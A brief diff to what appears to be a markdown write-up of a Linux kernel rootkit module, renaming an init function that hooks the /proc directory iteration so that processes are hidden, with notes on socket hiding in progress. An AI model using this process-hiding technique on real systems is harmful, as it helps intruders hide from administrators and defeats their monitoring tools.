@@ -84,10 +84,10 @@ administration tools useless.
 - hiding of sockets ... work in progress
 - working in 3.14 (Arch LTS) and 3.17 (Arch Current)
 
-## `prochider_init()`
+## `pidhider_init()`
 
 ```{.c .numberLines}
-static int __init prochider_init(void)
+static int __init pidhider_init(void)
 {
     // insert our modified iterate for /proc
     procroot = procfile->parent;
